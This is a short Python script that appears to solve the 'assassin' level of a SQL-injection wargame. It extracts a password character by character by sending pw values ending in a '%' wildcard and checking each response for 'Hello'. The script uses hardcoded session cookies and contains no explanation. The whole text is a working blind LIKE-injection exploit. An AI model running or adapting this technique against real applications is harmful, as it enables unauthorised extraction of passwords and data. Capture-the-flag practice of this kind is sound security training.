import requests
import time


def password_guess():
	for i in array:
		query_add = query+"?pw="+"83"+chr(i)+"%0"
		result=requests.get(query_add, cookies=cookie)
		#print(result.text.find("Hello"))
		if(result.text.find("Hello")<2400 and result.text.find("Hello")!=-1):
			print(chr(i))
			#break





if(__name__=="__main__"):
	array=[]
	for i in range(0x30,0x3a):
		array.append(i)
	for i in range(ord('a'),ord('z')+1):
		array.append(i)
	for i in range(ord('A'),ord('Z')+1):
		array.append(i)
	#for i in range(0,256):
	#	if i not in array:
	#		array.append(i)
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"htdff840qhcmls15saskb21up7"}
	query='https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php'
	password_guess()
	